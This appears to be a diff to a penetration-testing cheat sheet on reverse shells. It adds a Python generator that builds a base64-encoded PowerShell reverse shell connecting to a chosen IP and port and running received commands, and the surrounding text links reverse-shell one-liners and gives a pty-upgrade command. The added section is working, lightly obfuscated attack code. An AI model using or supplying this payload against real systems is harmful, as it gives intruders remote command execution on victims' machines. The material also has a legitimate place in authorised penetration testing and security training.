@@ -148,6 +148,32 @@ Also check out [Bernardo’s Reverse Shell One-Liners](http://bernardodamele.blo
 
 There’s a [reverse shell written in gawk over here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387).  Gawk is not something that I’ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentester might want to use for reverse shells.
 
+## Windows Reverse (Power) Shell Generator
+
+Tiny script to create a sloppy obfuscated Reverse Shell for PowerShell by applying base64 encoding to the payload:
+
+```python
+import sys
+import base64
+
+try:
+    (ip, port) = (sys.argv[1], int(sys.argv[2]))
+except:
+    print("USAGE: %s IP PORT" % sys.argv[0])
+    print("Returns a Reverse Shell for PowerShell with base64 encoded cmdline payload helping to connect to an IP:PORT")
+    exit()
+
+# Payload from Nikhil Mittal @samratashok https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+payload = payload % (ip, port)
+
+cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmdline)
+```
+
+
 ## Upgrading your Reverse Shell
 
 `python -c'import pty; pty.spawn("/bin/bash")'`
